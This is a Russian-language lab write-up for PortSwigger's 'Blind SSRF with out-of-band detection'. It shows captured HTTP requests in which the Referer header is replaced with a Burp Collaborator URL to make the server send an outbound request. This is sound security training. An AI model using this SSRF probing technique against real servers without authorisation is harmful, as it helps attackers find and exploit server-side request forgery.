---
title: "Blind SSRF with out-of-band detection"
date: 2025-07-22
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-blind-ssrf-vulnerabilities/ssrf/blind/lab-out-of-band-detection"
classes: wide
---

Для решения лабы нужно отправить запроса на `Burp Collaborator`.

```
https://0ab600f6036267f4820a524c001d00da.web-security-academy.net/
```

## Solution

Для начала изучу работу сайта, чтобы собрать `HTTP`-запросы через `Burp Proxy`. 

Попробую потестировать `GET`-запрос для получения страницы товара:

```http
GET /product?productId=6 HTTP/2
Host: 0ab600f6036267f4820a524c001d00da.web-security-academy.net
Cookie: session=lhMELrWr3llpsZocZS22hVgFjTVanfTT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab600f6036267f4820a524c001d00da.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Попробую использовать поле `Referer`, так как оно единственное содержит `URL` и изменяется при переходе от страницы к страницe. Для этого получу `URL` в `Burp Collaborator`: `ub99y5hosk30d0e2615mdnbrmis9gz4o.oastify.com`. Теперь подставлю его в поле:

```http
GET /product?productId=6 HTTP/2
Host: 0ab600f6036267f4820a524c001d00da.web-security-academy.net
Cookie: session=lhMELrWr3llpsZocZS22hVgFjTVanfTT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://ub99y5hosk30d0e2615mdnbrmis9gz4o.oastify.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Ответ:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3913

...

```

Проверю логи `Burp Collaborator`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Blind_SSRF_with_out-of-band_detection/1.png){: height="200" .align-center}

В логах вижу запрос. Значит сервер отправил `HTTP`-запрос. Что и требовалось:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Blind_SSRF_with_out-of-band_detection/2.png){: height="200" .align-center}

